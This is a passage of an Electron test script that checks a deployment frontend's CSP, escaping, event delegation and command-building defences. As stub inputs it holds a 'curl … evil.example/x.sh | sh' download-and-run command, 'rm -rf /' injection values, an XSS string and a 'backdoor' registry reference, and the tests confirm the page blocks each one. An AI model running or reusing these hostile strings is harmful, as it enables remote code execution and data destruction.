"use strict";

// Drives the real frontend/index.html in a real Electron window.
//
// Covers the Docker deploy form (docs/docker-design.md §8) and the frontend QA
// regressions F-03..F-13. The control plane is only used to serve the page:
// every API call the assertions depend on is stubbed via window.fetch, so the
// test is deterministic and needs no Docker on this machine.
//
//   MDP_URL=http://127.0.0.1:8790 ./node_modules/.bin/electron test-frontend.js

const { app, BrowserWindow } = require("electron");
app.disableHardwareAcceleration();
// The page is served over HTTP; without this Electron may hand back a stale
// cached index.html from an earlier run instead of the file on disk.
app.commandLine.appendSwitch("disable-http-cache");

const URL = process.env.MDP_URL || "http://127.0.0.1:8790";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let pass = 0;
let fail = 0;
function check(name, ok, detail) {
  console.log((ok ? "  PASS  " : "  FAIL  ") + name + (detail ? "  -> " + detail : ""));
  if (ok) pass += 1;
  else fail += 1;
}

// Replaces window.fetch with a canned router. Every request is recorded in
// window.__CAP so a test can assert what createDeploy actually sent.
const INSTALL = `(() => {
  window.__CAP = [];
  window.__DEPS = [];
  window.__REJECTED = [];
  window.__REC = null;
  window.__CONFIG = null;
  const json = (obj, ok, status) => Promise.resolve({ ok: ok === undefined ? true : ok, status: status || 200, json: () => Promise.resolve(obj) });
  window.fetch = function (url, opts) {
    opts = opts || {};
    const u = String(url);
    // 匹配只看路径：写操作现在会带 ?token=...（DESK-29）。
    const p = u.split('?')[0];
    const method = (opts.method || 'GET').toUpperCase();
    window.__CAP.push({ url: u, path: p, method: method, body: opts.body || null });
    if (p === '/api/deployments' && method === 'GET') return json({ deployments: window.__DEPS, rejected: window.__REJECTED || [] });
    if (p === '/api/deployments' && method === 'POST') return json({ id: 'dep_new' });
    if (p.indexOf('/api/deployments/') === 0) return json({});
    if (p === '/api/models/recommend') return json(window.__REC || {});
    if (p === '/api/environment/latest') return json({});
    if (p === '/api/backends') return json(window.__CONFIG || {});
    if (p === '/api/hardware/resolve') return json({ budget: {}, normalized: {} });
    if (p === '/api/models/gguf/plan') return json(window.__GGUF_PLAN || {},
      window.__GGUF_PLAN_OK === undefined ? true : window.__GGUF_PLAN_OK,
      window.__GGUF_PLAN_STATUS);
    return json({});
  };
  window.__stubFetch = window.fetch;
  clearTimeout(window.__depPoll);
  return true;
})()`;

async function loadWithRetry(win) {
  // Bust both the disk cache and any HTTP cache keyed on the bare URL.
  const bust = URL + (URL.indexOf("?") >= 0 ? "&" : "?") + "t=" + Date.now();
  for (let i = 0; i < 3; i += 1) {
    try {
      await win.webContents.session.clearCache();
      await win.loadURL(bust);
      return;
    } catch (e) {
      if (i === 2) throw e;
      await sleep(2500);
    }
  }
}

app.whenReady().then(async () => {
  const win = new BrowserWindow({ width: 1180, height: 980, show: false });
  win.webContents.on("console-message", (e, level, message) => {
    if (level >= 2) console.log("  [renderer] " + message);
  });
  const run = (js) => win.webContents.executeJavaScript(js);
  try {
    await loadWithRetry(win);
  } catch (e) {
    console.log("  FAIL  打不开 " + URL + "：" + e.message);
    app.exit(1);
    return;
  }
  await sleep(2500);
  await run(INSTALL);
  await sleep(200);

  // --- F-11: every label points at a real control -------------------------
  const labels = await run(`(() => {
    const all = [...document.querySelectorAll('label')];
    const noFor = all.filter((l) => !l.getAttribute('for')).map((l) => l.textContent.trim());
    const dangling = all.filter((l) => l.getAttribute('for') && !document.getElementById(l.getAttribute('for'))).map((l) => l.getAttribute('for'));
    return { total: all.length, noFor, dangling };
  })()`);
  check("label 全部带 for", labels.total > 0 && labels.noFor.length === 0, "共 " + labels.total + " 个，缺 for：" + labels.noFor.join(","));
  check("label 的 for 都指向存在的控件", labels.dangling.length === 0, labels.dangling.join(","));

  // --- F-12: id="service" has an entry -----------------------------------
  const svc = await run(`(() => {
    const a = [...document.querySelectorAll('#deploy .head a')].find((x) => x.textContent.indexOf('服务测试') >= 0);
    if (!a) return { found: false };
    a.click();
    return { found: true, target: !!document.getElementById('service') };
  })()`);
  check("服务测试有入口且 #service 存在", svc.found === true && svc.target === true);

  // --- 控制面是不可信的，页面不能去外面取脚本/帧/对象 ---------------------
  // Electron 在开发模式下会警告这个页面没有 CSP。警告本身只在未打包时出现，
  // 但「没有 CSP」这个事实一直都在，所以这里断言它真的存在、真的生效。
  const csp = await run(`(async () => {
    const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    const c = m ? m.getAttribute('content') : '';
    // 无网络也能确定性验证：脚本源没有 unsafe-eval，eval 必须被拒。
    let evalBlocked = false;
    try { (0, eval)('1+1'); } catch (e) { evalBlocked = String(e).indexOf('EvalError') >= 0 || String(e).length > 0; }
    let sameOk = false;
    try { const r = await fetch('/api/health'); sameOk = !!r; } catch (e) { sameOk = false; }
    return { has: !!m, c, evalBlocked, sameOk };
  })()`);
  check("页面设置了 Content-Security-Policy", csp.has === true);
  check("CSP 默认拒绝（default-src none）且禁用 object/base/form",
    /default-src 'none'/.test(csp.c) && /object-src 'none'/.test(csp.c) &&
    /base-uri 'none'/.test(csp.c) && /form-action 'none'/.test(csp.c), csp.c.slice(0, 80));
  check("CSP 限制 connect-src 为同源", /'self'/.test(csp.c) && /connect-src/.test(csp.c), csp.c.slice(0, 80));
  check("CSP 真的在生效（eval 被拒）", csp.evalBlocked === true);
  check("CSP 没有把同源请求一起挡掉", csp.sameOk === true);

  // 断言 CSP 到底挡了什么。注意这里断言的是 **violation 事件**，不是 onerror ——
  // 没有网络时远程脚本也会 onerror，那样测试会因为错误的原因通过。
  const inject = await run(`(async () => {
    const v = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      v.push(String(e.violatedDirective || ''));
    });
    // 内联注入：CSP 里有 unsafe-inline，预期会执行（已知弱点，不是回归）
    const s1 = document.createElement('script');
    s1.textContent = 'window.__INL = true;';
    document.head.appendChild(s1);
    const inlineRan = window.__INL === true;
    // 外部注入：应当被 script-src-elem 拦下并产生 violation
    await new Promise((resolve) => {
      const s2 = document.createElement('script');
      s2.src = 'https://example.com/evil.js';
      s2.onload = resolve; s2.onerror = resolve;
      document.head.appendChild(s2);
      setTimeout(resolve, 1500);
    });
    return { inlineRan, violations: v };
  })()`);
  check("CSP 拦下注入的外部脚本（按 violation 事件判定）",
    inject.violations.some((d) => d.indexOf('script-src') >= 0),
    JSON.stringify(inject.violations));
  // 这条原本是「记录已知边界：内联注入仍会执行」。清掉全部内联事件处理器之后，
  // script-src 去掉了 'unsafe-inline' 改用 nonce，哨兵按设计变红 —— 现在改成断言
  // 新的、更强的行为：注入的内联脚本**也会被执行拒绝**。
  check("CSP 连注入的内联脚本也拦下（script-src 已改为 nonce）",
    inject.inlineRan === false, String(inject.inlineRan));
  check("内联注入被拒时产生 script-src 违规事件",
    inject.violations.some((d) => d.indexOf('script-src') >= 0),
    JSON.stringify(inject.violations));

  // --- 事件委托：CSP 去掉 unsafe-inline 之后，所有交互都走 data-act/data-change ---
  // 这组一定要有：把 click 委托整个关掉时，上面的断言**全都照样通过**（已验证），
  // 也就是说没有这组测试，委托坏掉了也没人知道。
  const delegate = await run(`(async () => {
    const out = {};
    // 1) data-act + data-ram：quickRam 会把内存档位写进 #pf-ram
    const qr = document.querySelector('[data-act="quickRam"][data-ram="16"]');
    out.foundQuickRam = !!qr;
    document.getElementById('pf-ram').value = '';
    if (qr) qr.click();
    out.ram = document.getElementById('pf-ram').value;
    // 2) data-act="closeModal"
    openInstallModal('mlx');
    out.opened = getComputedStyle(document.getElementById('modal')).display !== 'none';
    const cb = document.querySelector('[data-act="closeModal"]');
    out.foundClose = !!cb;
    if (cb) cb.click();
    out.closed = getComputedStyle(document.getElementById('modal')).display === 'none';
    // 3) 背景点击只在自己身上才关闭：点对话框内部不能关
    openInstallModal('mlx');
    const inner = document.getElementById('m-body');
    if (inner) inner.click();
    out.stillOpenAfterInnerClick = getComputedStyle(document.getElementById('modal')).display !== 'none';
    document.getElementById('modal').click();
    out.closedByBackdrop = getComputedStyle(document.getElementById('modal')).display === 'none';
    // 4) data-act="jump" 不应把页面导航走
    const before = location.href;
    const jl = document.querySelector('[data-act="jump"]');
    out.foundJump = !!jl;
    if (jl) jl.click();
    out.urlUnchanged = location.href === before;
    // 5) 静态断言：不应再有任何内联事件处理器（CSP 会拒绝它们）
    out.inlineHandlers = document.querySelectorAll('[onclick],[onchange]').length;
    return out;
  })()`);
  check("委托的 click 能跑通并读到 data-ram（quickRam -> #pf-ram）",
    delegate.foundQuickRam === true && delegate.ram === '16',
    JSON.stringify({ f: delegate.foundQuickRam, ram: delegate.ram }));
  check("委托的 closeModal 按钮能关掉弹框",
    delegate.opened === true && delegate.foundClose === true && delegate.closed === true,
    JSON.stringify(delegate) .slice(0, 90));
  check("点弹框内部不会误关，点背景才关",
    delegate.stillOpenAfterInnerClick === true && delegate.closedByBackdrop === true,
    JSON.stringify({ inner: delegate.stillOpenAfterInnerClick, back: delegate.closedByBackdrop }));
  check("委托的 jump 链接不会把页面导航走",
    delegate.foundJump === true && delegate.urlUnchanged === true,
    JSON.stringify({ f: delegate.foundJump, u: delegate.urlUnchanged }));
  check("页面里已无任何内联事件处理器（CSP 会拒绝它们）",
    delegate.inlineHandlers === 0, String(delegate.inlineHandlers));

  // --- DESK-26 的 UI 出口 ---------------------------------------------------
  // deploy.js 承诺「被丢弃的部署不会静默消失」。只把原因存进 _rejected 不算兑现，
  // 必须真的能画到页面上。这条从 /api/deployments 的 rejected 字段一路测到 DOM。
  const rejectedUI = await run(`(async () => {
    const out = {};
    const el = document.getElementById('d-rejected');
    out.exists = !!el;
    // 先确认空的时候不占地方
    window.__REJECTED = [];
    await refreshDeployments();
    out.hiddenWhenEmpty = getComputedStyle(el).display === 'none';
    // 再喂一条被拒绝的行
    window.__REJECTED = [{ id: 'dep_bad', reason: '模型标识不能以 - 开头', model_path: '--help' }];
    await refreshDeployments();
    out.shown = getComputedStyle(el).display !== 'none';
    out.text = el.textContent;
    // 注入面：reason / model_path 是文件来的，必须被 esc 掉。
    // 注意别用 querySelector('b') 判定 —— 模板自己就有一个 <b>，那样会误报。
    window.__REJECTED = [{ id: 'dep_x', reason: '<img src=x onerror=1>', model_path: '<b>x</b>' }];
    await refreshDeployments();
    out.noInjectedElement = el.querySelector('img') === null;
    // 转义的证据：标签以字面量形式出现在文本里，而不是变成元素
    out.literalInText = el.textContent.indexOf('<img src=x onerror=1>') >= 0;
    out.escaped = out.noInjectedElement && out.literalInText;
    window.__REJECTED = [];
    await refreshDeployments();
    return out;
  })()`);
  check("页面上有 #d-rejected 容器", rejectedUI.exists === true);
  check("没有拒绝项时容器不显示", rejectedUI.hiddenWhenEmpty === true);
  check("有拒绝项时页面明确显示，不再静默消失",
    rejectedUI.shown === true && rejectedUI.text.indexOf('dep_bad') >= 0,
    rejectedUI.text);
  check("拒绝原因里的 HTML 被转义（它同样来自不可信来源）",
    rejectedUI.escaped === true,
    JSON.stringify({ noEl: rejectedUI.noInjectedElement, literal: rejectedUI.literalInText }));

  // --- DESK-27: 把「将按哪个值执行、它从哪来」说出来 -------------------------
  // 下拉框显示的是模型显示名，实际执行的却是 source.ollama / source.huggingface。
  // 用户批准一个字符串、机器跑另一个，所以表单必须点明这件事。
  const origin = await run(`(async () => {
    const el = document.getElementById('d-origin');
    const pathEl = document.getElementById('d-path');
    const out = {};
    const rec = (ollama) => ({ recommendations: [
      { id: 'qwen3-8b', name: 'Qwen3 8B', quantization: 'Q4_K_M', fits: true,
        reason_key: 'ok', recommended: true, source: { ollama } },
    ] });
    // 1) 目录填的普通标签：提示出现，但不报第三方 registry
    fillDeployModels(rec('qwen3:8b'));
    document.getElementById('d-backend').value = 'ollama';
    syncDeploy();
    out.plainShown = getComputedStyle(el).display !== 'none';
    out.plainText = el.textContent;
    out.plainMentionsRegistry = /registry|拉取/.test(out.plainText);
    // 1b) tag 里的冒号不是 registry 端口（这里曾经误报成 registry「qwen3:8b」）
    out.plainBadRegistry = /第三方/.test(out.plainText);
    // 2) namespace 不是 registry：qwen/qwen3 必须**不**触发第三方告警
    fillDeployModels(rec('qwen/qwen3:8b'));
    document.getElementById('d-backend').value = 'ollama';
    syncDeploy();
    out.namespaceWarned = /第三方/.test(el.textContent);
    // 3) 真正的第三方 registry：必须点名主机
    fillDeployModels(rec('evil-registry.example.com/backdoor:latest'));
    document.getElementById('d-backend').value = 'ollama';
    syncDeploy();
    out.evilWarned = /第三方/.test(el.textContent);
    out.evilNamesHost = el.textContent.indexOf('evil-registry.example.com') >= 0;
    // 4) hf.co 是已知 registry，不该被报成第三方
    fillDeployModels(rec('hf.co/user/repo:Q4_K_M'));
    document.getElementById('d-backend').value = 'ollama';
    syncDeploy();
    out.hfWarned = /第三方/.test(el.textContent);
    // 5) 用户自己改过就不该再说是「自动填的」
    fillDeployModels(rec('qwen3:8b'));
    document.getElementById('d-backend').value = 'ollama';
    syncDeploy();
    pathEl.value = 'my:own-tag';
    pathEl.dispatchEvent(new Event('change', { bubbles: true }));
    out.hiddenAfterEdit = getComputedStyle(el).display === 'none';
    return out;
  })()`);
  check("DESK-27 目录自动填时给出提示", origin.plainShown === true, origin.plainText);
  check("DESK-27 提示说明这个值不是你填的",
    origin.plainText.indexOf('不是你填的') >= 0, origin.plainText);
  check("DESK-27 普通 tag 的冒号不被当成 registry（qwen3:8b）",
    origin.plainBadRegistry === false, origin.plainText);
  check("DESK-27 namespace 不被误报成第三方 registry（qwen/qwen3）",
    origin.namespaceWarned === false, String(origin.namespaceWarned));
  check("DESK-27 已知 registry hf.co 不被误报",
    origin.hfWarned === false, String(origin.hfWarned));
  check("DESK-27 第三方 registry 被点名",
    origin.evilWarned === true && origin.evilNamesHost === true,
    JSON.stringify({ w: origin.evilWarned, h: origin.evilNamesHost }));
  check("DESK-27 用户自己改过之后提示消失", origin.hiddenAfterEdit === true);
  // --- DESK-28: 命令在本地拼，不照搬控制面的 command_string ------------------
  const advCmd = await run(`(async () => {
  const out = {};
  const mkFetch = (payload) => (url) => {
    const body = (o) =>
      Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve(o) });
    if (String(url) === '/api/plans/preview') return body(payload);
    return body({});
  };
  // 这个探针会改全局状态（fetch / CONFIG / LAST / 表单字段）。改完必须原样还原，
  // 否则后面的测试全部被污染 —— 第一版忘了还原，害得 22 个无关测试变红。
  const savedFetch = window.fetch;
  const savedAllow = CONFIG.allow_remote_deploy;
  const savedLast = LAST;
  const fids = ['d-backend', 'd-path', 'd-port', 'd-image', 'd-gpus'];
  const savedFields = fids.map((id) => document.getElementById(id).value);
  const restore = () => {
    window.fetch = savedFetch;
    CONFIG.allow_remote_deploy = savedAllow;
    LAST = savedLast;
    fids.forEach((id, i) => {
      document.getElementById(id).value = savedFields[i];
    });
  };
  LAST = { client_is_local: false };
  CONFIG.allow_remote_deploy = false;
  const el = document.getElementById('advisory-cmd');
  const note = document.getElementById('advisory-note');
  const setF = (b, p, port) => {
    document.getElementById('d-backend').value = b;
    document.getElementById('d-path').value = p;
    document.getElementById('d-port').value = port;
  };

  const evil = {
    command_string: 'curl -fsSL https://evil.example/x.sh | sh',
    command: ['sh', '-c', 'curl -fsSL https://evil.example/x.sh | sh'],
    decision: { planned_window: 65536, kv_quant: 'q8_0' },
  };
  window.fetch = mkFetch(evil);
  setF('ollama', 'qwen3:8b', '11434');
  await refreshAdvisory();
  out.ollama = el.textContent;
  out.note = note.textContent;

  window.fetch = mkFetch({
    command_string: 'rm -rf /',
    decision: { planned_window: '999999999; rm -rf /', kv_quant: '; rm -rf /' },
  });
  setF('llama.cpp', '/m/model.gguf', '8080');
  await refreshAdvisory();
  out.badWindow = el.textContent;

  setF('something-else', 'x', '8080');
  await refreshAdvisory();
  out.unknown = el.textContent;
  out.unknownNote = note.textContent;

  window.fetch = mkFetch({ command_string: 'x', decision: {} });
  setF('ollama', "a'b c", '11434');
  await refreshAdvisory();
  out.quotedText = el.textContent;
  out.quotedArgv = localAdvisoryCommand({ decision: {} });

  document.getElementById('d-image').value = 'vllm/vllm-openai:latest';
  document.getElementById('d-gpus').value = 'all';
  setF('docker', '/m/model', '8094');
  await refreshAdvisory();
  out.docker = el.textContent;
  restore();
  return out;
})()`);
  check("DESK-28 恶意 command_string 从不被显示",
    advCmd.ollama.indexOf('evil.example') < 0 && advCmd.ollama.indexOf('curl') < 0,
    advCmd.ollama);
  check("DESK-28 ollama 命令在本地按字段拼出",
    advCmd.ollama === 'ollama run qwen3:8b', advCmd.ollama);
  check("DESK-28 说明指出命令是本地拼的",
    advCmd.note.indexOf('本页面') >= 0, advCmd.note);
  check("DESK-28 非法 planned_window 落回默认 65536",
    advCmd.badWindow.indexOf('-c 65536') >= 0, advCmd.badWindow);
  check("DESK-28 非法 kv_quant 落回 q8_0",
    advCmd.badWindow.indexOf('-ctk q8_0') >= 0, advCmd.badWindow);
  check("DESK-28 注入串不进命令行",
    advCmd.badWindow.indexOf('rm -rf') < 0, advCmd.badWindow);
  check("DESK-28 未识别的后端不显示命令",
    advCmd.unknown === '—' && advCmd.unknownNote.indexOf('桌面端') >= 0,
    JSON.stringify({ c: advCmd.unknown, n: advCmd.unknownNote }));
  check("DESK-28 含空格与单引号的路径是一个参数",
    advCmd.quotedArgv.length === 3 && advCmd.quotedArgv[2] === "a'b c",
    JSON.stringify(advCmd.quotedArgv));
  check("DESK-28 docker 命令带镜像推断出的容器端口",
    advCmd.docker.indexOf('127.0.0.1:8094:8000') >= 0 && advCmd.docker.indexOf('--gpus') >= 0,
    advCmd.docker);
  // console.warn 在 meta 里是无效指令，写上去只会假装有保护。
  check("CSP 没有写 meta 里无效的指令（frame-ancestors / sandbox）",
    csp.c.indexOf('frame-ancestors') < 0 && csp.c.indexOf('sandbox') < 0, csp.c.slice(0, 80));

  // --- Docker block visibility + macOS warning ----------------------------
  const vis = await run(`(() => {
    window.CONFIG = { backends: ['docker', 'ollama'], installable: {}, unavailable: {}, local: true, caps: { platform: 'darwin', docker: true, nvidia: false } };
    fillBackends();
    const sel = document.getElementById('d-backend');
    const block = document.getElementById('d-docker');
    const before = block.style.display;
    sel.value = 'docker'; sel.dispatchEvent(new Event('change', { bubbles: true }));
    const shown = block.style.display;
    const warn = document.getElementById('d-docker-warn');
    const warnShown = warn.style.display !== 'none' && warn.textContent.length > 0;
    const warnText = warn.textContent;
    sel.value = 'ollama'; sel.dispatchEvent(new Event('change', { bubbles: true }));
    const hidden = block.style.display;
    return { before, shown, hidden, warnShown, warnText };
  })()`);
  check("docker 区块默认隐藏", vis.before === "none", vis.before);
  check("选 docker 后显示", vis.shown !== "none", vis.shown);
  check("选回 ollama 后隐藏", vis.hidden === "none", vis.hidden);
  check("macOS 桌面端提示容器拿不到 GPU", vis.warnShown === true && /GPU/.test(vis.warnText), vis.warnText.slice(0, 40));

  const noWarn = await run(`(() => {
    window.CONFIG.caps = { platform: 'linux', docker: true, nvidia: true };
    updateDockerBlock();
    const warn = document.getElementById('d-docker-warn');
    return { shown: warn.style.display !== 'none' };
  })()`);
  check("非 macOS 不显示 Mac 专属警告", noWarn.shown === false);

  // --- GPU 默认值必须匹配这台机器 ---------------------------------------
  // 默认请求 `--gpus all` 在拿不到 GPU 的机器上不只是无用：Docker 会先把整个
  // 镜像拉下来，然后才报 could not select device driver —— 用户白等一次多 GB 下载。
  const gpuDefault = await run(`(() => {
    window.CONFIG = { backends: ['docker', 'ollama'], installable: {}, unavailable: {}, local: true,
      caps: { platform: 'darwin', docker: true, nvidia: false } };
    fillBackends();
    const b = document.getElementById('d-backend');
    b.value = 'docker'; b.dispatchEvent(new Event('change', { bubbles: true }));
    const g = document.getElementById('d-gpus');
    g.removeAttribute('data-touched');
    updateDockerBlock();
    const mac = g.value;
    window.CONFIG.caps = { platform: 'linux', docker: true, nvidia: true };
    g.removeAttribute('data-touched');
    updateDockerBlock();
    const linux = g.value;
    g.value = 'none'; g.setAttribute('data-touched', '1');
    updateDockerBlock();
    const kept = g.value;
    g.removeAttribute('data-touched');
    window.CONFIG.caps = { platform: 'darwin', docker: true, nvidia: false };
    // 记录用户选择的方式变了：内联 onchange 已被 data-change 取代（CSP 不再允许内联处理器）。
    const gEl = document.getElementById('d-gpus');
    return { mac, linux, kept,
      markedByDelegate: gEl.getAttribute('data-change') === 'touched',
      noInlineHandler: gEl.getAttribute('onchange') === null };
  })()`);
  check("macOS 上 GPU 默认 none（all 在这里必然失败）", gpuDefault.mac === 'none', gpuDefault.mac);
  check("Linux + NVIDIA 上 GPU 默认 all", gpuDefault.linux === 'all', gpuDefault.linux);
  check("用户显式改过之后不再被覆盖", gpuDefault.kept === 'none', gpuDefault.kept);
  check("GPU 控件用 data-change 记录用户选择（不再用内联 onchange）",
    gpuDefault.markedByDelegate === true && gpuDefault.noInlineHandler === true,
    JSON.stringify({ d: gpuDefault.markedByDelegate, clean: gpuDefault.noInlineHandler }));

  // macOS 的警告必须说清楚「默认镜像在这里起不来」，否则用户会照着默认值点下去。
  const macWarnText = await run(`(() => {
    window.CONFIG = { backends: ['docker', 'ollama'], installable: {}, unavailable: {}, local: true,
      caps: { platform: 'darwin', docker: true, nvidia: false } };
    fillBackends();
    const b = document.getElementById('d-backend');
    b.value = 'docker'; b.dispatchEvent(new Event('change', { bubbles: true }));
    const t = document.getElementById('d-docker-warn').textContent;
    return { t };
  })()`);
  check("macOS 警告点名 vllm/vllm-openai 并给出实测依据",
    macWarnText.t.indexOf('vllm/vllm-openai') >= 0 && /could not select device driver/.test(macWarnText.t),
    macWarnText.t.slice(0, 120));
  // 实测过的（--gpus all 报错）和推断的（CUDA 镜像起不来）必须分开说，
  // 否则和这个分支一直以来的毛病一样：把假设写成事实。
  check("macOS 警告把「推断」和「实测」分开标注",
    macWarnText.t.indexOf('实测') >= 0 && macWarnText.t.indexOf('推断') >= 0,
    macWarnText.t.slice(0, 160));

  // 警告不能只说「你的镜像不行」：CPU 路径是通的，还要给出实测可用的替代。
  // 也**不能**再说「容器在 Mac 上不通」—— 真容器已经跑到能推理了。
  check("macOS 警告给出实测可用的 CPU 镜像",
    macWarnText.t.indexOf('ghcr.io/ggml-org/llama.cpp:server') >= 0,
    macWarnText.t.slice(-70));
  check("macOS 警告不再宣称「容器在 Mac 上不通」",
    macWarnText.t.indexOf('容器这条路在 Mac 上不通') < 0,
    macWarnText.t.slice(0, 70));

  // --- 预览必须和真正会执行的命令一致 -------------------------------------
  // advisory 预览以前自己拼请求、不带 docker 字段，于是它打印 --gpus all 和默认镜像，
  // 而真正部署用的是用户的选择 —— 告诉用户去复制的那条命令，不是这个应用会跑的命令。
  const adv = await run(`(async () => {
    window.__CAP.length = 0;
    window.CONFIG = { backends: ['docker', 'ollama'], installable: {}, unavailable: {}, local: true,
      allow_remote_deploy: false, caps: { platform: 'darwin', docker: true, nvidia: false } };
    LAST = { client_is_local: false };
    fillBackends();
    const b = document.getElementById('d-backend');
    b.value = 'docker'; b.dispatchEvent(new Event('change', { bubbles: true }));
    updateDockerBlock();
    document.getElementById('d-image').value = 'my/cpu-image:1';
    document.getElementById('d-volumes').value = '/tmp/models:/models:ro';
    document.getElementById('d-extra').value = '--max-model-len' + String.fromCharCode(10) + '4096';
    await refreshAdvisory();
    const p = window.__CAP.filter(c => c.url === '/api/plans/preview').pop();
    return { sent: p ? JSON.parse(p.body) : null, shown: document.getElementById('d-gpus').value };
  })()`);
  check("advisory 预览发出用户选的 GPU（不再写死 all）",
    !!adv.sent && adv.sent.gpus === 'none', adv.sent && adv.sent.gpus);
  check("advisory 预览发出用户填的镜像",
    !!adv.sent && adv.sent.image === 'my/cpu-image:1', adv.sent && adv.sent.image);
  check("advisory 预览发出数据卷",
    !!adv.sent && (adv.sent.volumes || []).length === 1, JSON.stringify(adv.sent && adv.sent.volumes));
  check("advisory 预览发出额外参数",
    !!adv.sent && (adv.sent.extra_args || []).length === 2, JSON.stringify(adv.sent && adv.sent.extra_args));
  // 真正部署时两边必须用同一份字段：同一个函数产出的值。
  const sameFields = await run(`(() => {
    const df = dockerFields();
    return { image: df.image, gpus: df.gpus, volumes: df.volumes.length, extra: df.extra_args.length, errs: df.errors.length };
  })()`);
  check("dockerFields() 与预览/部署共用同一份值",
    sameFields.image === 'my/cpu-image:1' && sameFields.gpus === 'none' && sameFields.volumes === 1 && sameFields.extra === 2,
    JSON.stringify(sameFields));

  // --- a pulled Docker image must read as ready, not as "install again" ------
  // The one-click install chain used to end nowhere: after `docker pull` the UI
  // still showed the same install offer, with no sign the image was local and no
  // pointer at the backend that actually runs it.
  const ready = await run(`(() => {
    window.CONFIG = {
      backends: ['docker', 'ollama'], local: true,
      caps: { platform: 'linux', docker: true, nvidia: true },
      unavailable: {},
      installable: { vllm: {
        info: 'x', steps: [], manual: 'docker pull vllm/vllm-openai:latest',
        via: 'docker', image: 'vllm/vllm-openai:latest', alreadyInstalled: true,
        note: '官方镜像 vllm/vllm-openai:latest 已在本地，无需重新拉取。部署请用 docker 后端。',
        gpu: 'g' } },
    };
    fillBackends();
    const note = backendNote('vllm');
    openInstallModal('vllm');
    const body = document.getElementById('m-body').textContent;
    const actions = document.getElementById('m-actions');
    const shown = getComputedStyle(document.getElementById('modal')).display !== 'none';
    const hasInstallBtn = !!document.getElementById('m-install');
    const hasCloseBtn = !!document.getElementById('m-close5');
    closeModal();
    return { note, body, shown, hasInstallBtn, hasCloseBtn };
  })()`);
  check("已拉取的镜像在下拉里标为「镜像已就绪」", /镜像已就绪/.test(ready.note), ready.note);
  check("已就绪时弹框打开且状态是「已在本地」", ready.shown === true && ready.body.indexOf('官方镜像已在本地') >= 0);
  check("已就绪时不再显示「确认安装」按钮", ready.hasInstallBtn === false);
  check("已就绪时说明里指向 docker 后端", ready.body.indexOf('docker 后端') >= 0);
  check("已就绪时不再列出将执行的步骤，显示「无需操作」", ready.body.indexOf('无需操作') >= 0);

  // 关键：不能只说「无需操作」就把用户丢下。按钮要真的把人送到部署表单，
  // 并且把镜像填成刚装好的那个。
  const jumped = await run(`(() => {
    window.CONFIG = {
      backends: ['docker', 'ollama'], local: true,
      caps: { platform: 'linux', docker: true, nvidia: true },
      unavailable: {},
      installable: { vllm: {
        info: 'x', steps: [], manual: 'docker pull vllm/vllm-openai:latest',
        via: 'docker', image: 'vllm/vllm-openai:latest', alreadyInstalled: true,
        note: 'n', gpu: 'g' } },
    };
    fillBackends();
    document.getElementById('d-image').value = 'something-else:tag';
    openInstallModal('vllm');
    const hadButton = !!document.getElementById('m-use');
    if (hadButton) document.getElementById('m-use').click();
    const sel = document.getElementById('d-backend');
    const block = document.getElementById('d-docker');
    const modalGone = getComputedStyle(document.getElementById('modal')).display === 'none';
    return {
      hadButton,
      backend: sel.value,
      image: document.getElementById('d-image').value,
      blockShown: block.style.display !== 'none',
      modalGone,
    };
  })()`);
  check("已就绪时给出「用 docker 后端部署」按钮", jumped.hadButton === true);
  check("点它会切到 docker 后端", jumped.backend === 'docker', jumped.backend);
  check("点它会把镜像填成刚装好的那个镜像", jumped.image === 'vllm/vllm-openai:latest', jumped.image);
  check("点它之后 docker 参数区块可见", jumped.blockShown === true);
  check("点它之后弹框关闭", jumped.modalGone === true);

  // 一个装不了的后端不该出现这个跳转按钮（跳过去也跑不起来）。
  const noJump = await run(`(() => {
    window.CONFIG.installable.vllm.alreadyInstalled = true;
    window.CONFIG.installable.vllm.via = 'pip';
    openInstallModal('vllm');
    const has = !!document.getElementById('m-use');
    const hasClose = !!document.getElementById('m-close5');
    closeModal();
    return { has, hasClose };
  })()`);
  check("非 docker 途径的已就绪项不给出跳转按钮，但仍可关闭",
    noJump.has === false && noJump.hasClose === true,
    JSON.stringify(noJump));

  // A not-yet-pulled image must still offer the install button - the ready state
  // above must not swallow the normal case.
  const notReady = await run(`(() => {
    window.CONFIG.installable.vllm.alreadyInstalled = false;
    window.CONFIG.installable.vllm.steps = ['拉取官方镜像'];
    openInstallModal('vllm');
    const hasInstallBtn = !!document.getElementById('m-install');
    const body = document.getElementById('m-body').textContent;
    closeModal();
    return { hasInstallBtn, body };
  })()`);
  check("未拉取时仍然给出「确认安装」按钮", notReady.hasInstallBtn === true);
  check("未拉取时状态是「本机未安装」", notReady.body.indexOf('本机未安装') >= 0);

  // An unavailable docker entry must not leave the docker block on screen: the
  // select reverts and opens the install dialog instead.
  const reverted = await run(`(() => {
    window.CONFIG = { backends: ['ollama'], installable: {}, unavailable: {}, local: true, caps: { platform: 'darwin', docker: false, nvidia: false } };
    fillBackends();
    const sel = document.getElementById('d-backend');
    sel.value = 'docker'; sel.dispatchEvent(new Event('change', { bubbles: true }));
    const block = document.getElementById('d-docker');
    const modalOpen = getComputedStyle(document.getElementById('modal')).display !== 'none';
    const selected = sel.value;
    closeModal();
    return { block: block.style.display, modalOpen, selected };
  })()`);
  check("不可用 docker 回退后区块隐藏且弹框打开",
    reverted.block === "none" && reverted.modalOpen === true && reverted.selected === "ollama", JSON.stringify(reverted));

  // --- createDeploy: docker request body ----------------------------------
  const dockerBody = await run(`(async () => { try {
    window.CONFIG = { backends: ['docker', 'ollama'], installable: {}, unavailable: {}, local: true, caps: { platform: 'darwin', docker: true, nvidia: false } };
    fillBackends();
    const sel = document.getElementById('d-backend');
    sel.value = 'docker'; sel.dispatchEvent(new Event('change', { bubbles: true }));
    document.getElementById('d-image').value = 'vllm/vllm-openai:latest';
    document.getElementById('d-gpus').value = '0,1';
    document.getElementById('d-port').value = '8000';
    document.getElementById('d-path').value = 'Qwen/Qwen3-8B';
    document.getElementById('d-volumes').value = ['/Users/me/My Models:/models:ro', '', '/Users/me/data:/data', ''].join(String.fromCharCode(10));
    document.getElementById('d-extra').value = ['--max-model-len', '65536', '', '--served-model-name My Model', ''].join(String.fromCharCode(10));
    window.__CAP.length = 0;
    await createDeploy();
    const post = window.__CAP.filter((c) => c.path === '/api/deployments' && c.method === 'POST')[0];
